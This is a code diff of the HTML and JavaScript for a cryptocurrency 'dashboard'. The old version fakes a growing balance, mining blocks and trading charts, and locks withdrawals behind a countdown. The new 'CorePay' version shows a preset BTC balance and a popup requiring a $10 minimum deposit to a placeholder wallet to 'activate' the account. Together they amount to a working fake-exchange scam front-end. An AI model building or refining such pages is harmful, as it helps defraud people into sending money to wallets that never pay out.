@@ -1,165 +1,180 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Exchange Dashboard</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>CorePay Dashboard</title>
 
 <style>
-
 body{margin:0;background:#0b0f14;font-family:system-ui;color:white}
-
-/* sidebar */
-
-.side{
-position:fixed;width:230px;height:100vh;background:#111827;padding:20px
+.header{background:#111827;padding:18px;display:flex;justify-content:space-between;align-items:center}
+.logo{height:34px}
+.grid{padding:18px;display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.card{
+background:rgba(17,24,39,.85);
+border-radius:18px;
+padding:20px;
+backdrop-filter:blur(10px);
+box-shadow:0 0 30px rgba(0,0,0,.4);
+transition:.2s;
 }
-
-.side img{width:150px;margin-bottom:20px}
-
-.side button{
-width:100%;padding:13px;margin:5px 0;
-background:#1f2937;border:none;color:white;border-radius:8px;cursor:pointer
+.card:hover{transform:translateY(-3px)}
+.balance{font-size:28px;font-weight:700;margin-top:6px}
+button{
+background:#22c55e;border:none;color:white;
+padding:12px 14px;border-radius:12px;
+cursor:pointer;margin-top:10px;font-weight:600;width:100%
 }
+select,input{
+width:100%;padding:12px;margin-top:10px;
+background:#0b0f14;border:1px solid #263041;
+border-radius:10px;color:white
+}
+.feed{font-size:14px;line-height:1.6}
+.tag{padding:3px 8px;border-radius:8px;font-size:12px}
+.green{background:#065f46}
+.yellow{background:#78350f}
+.red{background:#7f1d1d}
 
-.main{margin-left:230px;padding:30px}
-
-.card{background:#111827;padding:22px;border-radius:16px;margin-bottom:18px}
-
-.balance{font-size:42px}
-
-/* candle */
-
-canvas{background:black;border-radius:10px}
-
-/* popup */
-
-.pop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);
+.pop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);
 justify-content:center;align-items:center}
-
-.box{background:#111827;padding:30px;border-radius:16px;width:330px;text-align:center}
-
+.box{background:#111827;padding:28px;border-radius:16px;width:340px;text-align:center}
+.bar{height:8px;background:#1f2937;border-radius:8px;margin-top:15px}
+.fill{height:100%;width:0;background:#22c55e}
 </style>
 </head>
 
 <body>
 
-<div class="side">
-
-<img src="logo.png">
-
-<button onclick="withdraw()">Withdraw</button>
-<button onclick="admin()">Admin Backend</button>
-<button onclick="logout()">Logout</button>
-
+<div class="header">
+<div style="display:flex;align-items:center;gap:10px">
+<img src="logo.png" class="logo">
+<strong>CorePay</strong>
+</div>
+<div id="walletLabel"></div>
 </div>
 
-<div class="main">
+<div class="grid">
 
+<!-- WALLET -->
 <div class="card">
-Wallet:<br>
-<b id="w"></b>
+<h3>Wallet Overview</h3>
+<div class="balance" id="bal">0.000 BTC</div>
+<div id="pending">Pending: 0</div>
+<div id="crypto">Crypto: BTC</div>
+<button onclick="showActivation()">Activate Wallet</button>
+<a href="withdrawal.html"><button>Withdraw</button></a>
 </div>
 
+<!-- COIN SELECT -->
 <div class="card">
-Balance
-<div class="balance" id="bal">0.00</div>
+<h3>Select Crypto</h3>
+<select id="coin">
+<option>BTC</option>
+<option>SOL</option>
+<option>TRX</option>
+<option>USDT-TRC20</option>
+<option>USDT-ERC20</option>
+<option>BNB</option>
+<option>ETH</option>
+<option>XRP</option>
+<option>ADA</option>
+<option>DOGE</option>
+<option>MATIC</option>
+<option>LTC</option>
+<option>AVAX</option>
+<option>DOT</option>
+</select>
 </div>
 
+<!-- FEED -->
 <div class="card">
-Mining Engine
-<div id="mine">Starting nodes…</div>
-</div>
-
-<div class="card">
-Trading Screen
-<canvas id="c" width="500" height="200"></canvas>
+<h3>Activity</h3>
+<div class="feed" id="feed"></div>
 </div>
 
 </div>
 
-
-<!-- withdraw countdown -->
-
-<div class="pop" id="lockPop">
+<!-- ACTIVATION POP -->
+<div class="pop" id="actPop">
 <div class="box">
-<h3>Withdrawal Locked</h3>
-<p>Unlocks in:</p>
-<h2 id="timer">60</h2>
-</div>
+
+<h3>Deposit a minimum of $10 into your wallet to initiate activation</h3>
+
+<select id="actCoin"></select>
+<input id="actAmt" placeholder="Amount to deposit">
+
+<div style="display:flex;gap:6px">
+<input id="walletShow" value="xxx-wallet-address" readonly>
+<button onclick="copy()">📋</button>
 </div>
 
+<button onclick="confirmDeposit()">Deposit</button>
+
+<div class="bar"><div class="fill" id="bar"></div></div>
+
+</div>
+</div>
 
 <script>
 
-w.innerText=localStorage.wallet;
+/* LOAD WALLET */
+const wallet=localStorage.wallet||"demo";
+walletLabel.innerText=wallet;
 
+/* STORAGE KEY */
+const key="corepay_"+wallet;
 
-/* auto profit */
+/* DEFAULT DATA */
+let data=JSON.parse(localStorage.getItem(key))||{
+balance:"0.042 BTC",
+pending:[],
+history:[]
+};
 
-let b=15000+Math.random()*4000;
-setInterval(()=>{
-b+=Math.random()*7;
-bal.innerText=b.toFixed(2);
-},1300);
-
-
-/* mining engine */
-
-let blocks=0;
-setInterval(()=>{
-blocks++;
-mine.innerText="Block confirmed #"+blocks;
-},2200);
-
-
-/* candle animation */
-
-let ctx=c.getContext("2d");
-
-setInterval(()=>{
-ctx.fillStyle="black";
-ctx.fillRect(0,0,500,200);
-
-for(let i=0;i<20;i++){
-let h=Math.random()*120;
-ctx.fillStyle=Math.random()>.5?"#22c55e":"#ef4444";
-ctx.fillRect(i*25+20,180-h,10,h);
-}
-},900);
-
-
-/* withdraw lock timer */
-
-function withdraw(){
-lockPop.style.display="flex";
-
-let t=60;
-timer.innerText=t;
-
-let x=setInterval(()=>{
-t--;
-timer.innerText=t;
-if(t<=0){
-clearInterval(x);
-lockPop.style.display="none";
-alert("Withdrawal Unlocked");
-}
-},1000);
+function save(){
+localStorage.setItem(key,JSON.stringify(data));
 }
 
+/* DISPLAY */
+function render(){
+bal.innerText=data.balance;
+pending.innerText="Pending: "+data.pending.length;
+feed.innerHTML="";
+data.history.slice().reverse().forEach(i=>{
+feed.innerHTML+=`<div>${i}</div>`;
+});
+}
+render();
 
-/* admin wallet generator */
-
-function admin(){
-localStorage.wallet="0x"+Math.random().toString(16).slice(2,42);
-alert("New user wallet generated");
-location.reload();
+/* ACTIVATION */
+function showActivation(){
+actPop.style.display="flex";
+actCoin.innerHTML=coin.innerHTML;
+walletShow.value="xxx-"+coin.value+"-wallet";
+let p=0;
+let t=setInterval(()=>{
+p+=2;bar.style.width=p+"%";
+if(p>=100){clearInterval(t);actPop.style.display="none";}
+},300);
 }
 
-function logout(){
-location="index.html";
+/* COPY */
+function copy(){
+navigator.clipboard.writeText(walletShow.value);
 }
+
+/* CONFIRM DEPOSIT */
+function confirmDeposit(){
+data.pending.push("Deposit pending "+actCoin.value);
+data.history.push("Deposit pending "+actCoin.value+" <span class='tag yellow'>Pending</span>");
+save();
+render();
+actPop.style.display="none";
+}
+
+/* SKELETON LOAD */
+setTimeout(()=>document.body.style.opacity=1,300);
 
 </script>
 
